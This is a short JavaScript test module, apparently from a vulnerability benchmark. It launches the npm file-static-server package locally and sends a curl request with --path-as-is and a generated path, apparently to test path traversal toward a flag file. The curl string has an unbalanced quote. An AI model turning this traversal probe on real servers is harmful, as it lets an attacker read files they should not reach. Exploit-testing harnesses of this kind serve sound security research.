function exploitFunction(payload) {
  const { genstr } = payload;

  afterAll(() => {
    try {
      execSync("fuser -k 8970/tcp");
    } catch (e) {}
  });

  const path = require("path");
  const sleep = require("sleep");
  const pathToFlag = path.resolve(__dirname, "../flag.html");

  let server = "node ./node_modules/file-static-server/server.js  8970";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8970${genstr(50)}`; // Using the payload's genstr function

  exec(attack_string, (error, stdout) => {
    if (stdout) {
      console.log(stdout); // For debugging purposes
    }
  });
}

module.exports = { exploitFunction };